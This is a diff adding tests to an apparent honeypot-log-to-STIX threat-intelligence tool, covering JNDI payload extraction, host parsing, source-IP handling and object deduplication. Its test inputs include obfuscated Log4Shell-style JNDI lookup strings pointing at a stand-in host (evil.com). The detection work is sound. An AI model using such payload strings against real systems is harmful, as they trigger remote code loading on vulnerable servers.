@@ -467,3 +467,92 @@ def test_prune_removes_pre_existing_malformed_rows(state_db):
     with state_db._conn() as c:
         rows = c.execute("SELECT src_ip FROM attacker_activity").fetchall()
     assert [r[0] for r in rows] == ["45.9.10.11"]
+
+
+# ---------------------------------------------------------------------------
+# 6. Independent-review regressions (2026-08-04)
+# ---------------------------------------------------------------------------
+
+def test_host_of_rejects_a_bare_registry_suffix():
+    """`${sys:java.version}.co.uk` must not become a Domain-Name for
+    `co.uk` — that attaches honeypot evidence to a public registry."""
+    found = extract_jndi(
+        "${" + _per_char("jndi:ldap://x-", 1) + "${sys:java.version}"
+        + _per_char(".co.uk/a", 30) + "}"
+    )
+    assert len(found) == 1
+    assert found[0].host is None          # no Domain-Name minted...
+    assert found[0].url.endswith(".co.uk/a")   # ...but the URL survives
+
+
+def test_host_of_declines_a_guessed_two_label_name():
+    """After stripping templated labels we cannot tell a registrable
+    suffix from a real C2 domain, so we decline rather than assert."""
+    found = extract_jndi(
+        "${" + _per_char("jndi:ldap://x-", 1) + "${sys:java.version}"
+        + _per_char(".evil.com/a", 30) + "}"
+    )
+    assert found[0].host is None
+    assert found[0].url.endswith(".evil.com/a")
+
+
+def test_host_of_accepts_a_fully_literal_two_label_name():
+    """No stripping means the name is exactly what was sent."""
+    assert extract_jndi(_obfuscate("jndi:ldap://evil.com/a"))[0].host == "evil.com"
+
+
+def test_host_of_rejects_a_malformed_authority():
+    """`a..b.example` must not be silently repaired to `a.b.example` —
+    that reports a name the attacker never sent."""
+    assert extract_jndi(_obfuscate("jndi:ldap://a..b.example/a"))[0].host is None
+
+
+def test_absent_src_ip_is_not_treated_as_a_rejected_address(cfg, state_db):
+    """The gate rejects a src_ip that is PRESENT but unusable. An absent
+    src_ip is the fallback parser's own documented case and must reach
+    the build path exactly as it did before the gate existed.
+
+    Verified against the pre-change commit: such a doc parses
+    (events_parsed=1) and emits identity + marking-definition only —
+    `_is_bare_scan` suppresses the fallback Note for a payload-less
+    event, which is pre-existing behaviour this gate must not alter.
+    """
+    doc = {
+        "@timestamp": _NOW.isoformat(),
+        "type": "BrandNewHoneypotNoSrc",
+        "t-pot_hostname": "sensor-a",
+        "blob": {"foo": "bar"},
+    }
+
+    summary, objects = _run(cfg, state_db, [doc])
+
+    assert summary["drop_reasons"]["src_ip_rejected"] == 0
+    assert summary["events_parsed"] == 1
+    assert {o["type"] for o in objects} == {"identity", "marking-definition"}
+
+
+def test_salvage_survives_the_url_already_being_in_the_bundle(cfg, state_db):
+    """If a normal web session already emitted the same URL, _dedup
+    returns None for it — the salvage graph must still be built, since
+    the endpoint was genuinely observed."""
+    builder = STIXBuilder(cfg)
+    parser = H0neytr4pParser()
+    ev = parser.parse(_legacy_doc(src_ip=_PAYLOAD))
+
+    # Pre-emit the URL so the salvage path's build_url() returns None.
+    assert builder.build_url(_C2_URL) is not None
+
+    objects = builder.build_unattributed_payload_objects([ev])
+    types = {o["type"] for o in objects}
+
+    assert "domain-name" in types, "the C2 domain must not be lost"
+    assert "vulnerability" in types
+    assert "sighting" in types
+    assert "note" in types
+    # Every relationship still points at the (already-emitted) URL id.
+    from tpot2cti.stix_ids import generate_url_id
+    url_id = generate_url_id(_C2_URL)
+    rels = [o for o in objects if o["type"] == "relationship"]
+    assert rels and all(
+        url_id in (r["source_ref"], r["target_ref"]) for r in rels
+    )
